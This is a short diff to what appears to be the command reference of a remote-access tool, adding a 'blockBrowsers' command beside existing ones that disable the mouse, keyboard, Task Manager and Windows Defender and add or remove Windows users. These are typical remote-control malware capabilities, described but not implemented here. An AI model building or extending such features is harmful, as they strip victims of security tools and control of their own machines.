@@ -63,6 +63,7 @@ disableMouse = Disable the mouse
 disableKeyboard = Disable the keyboard
 disableTaskManager = Disable the task manager for a second
 blockWindowsDefender = Disable the windows defender for a second
+blockBrowsers = Disable the user's browsers with taskblock (10 Browsers Opera/Brave/Chrome/Edge/Firefox/Safari/Chromium/Vivaldi/DuckDuckGO/I Explore)
 winUserAdd;username;password = Windows user adding (with f-string)
 winUserRemove;username = Windows user removing (with f-string)
 notify;app_name;title;message;duration = Create a notification (for Android/Linux/Windows)
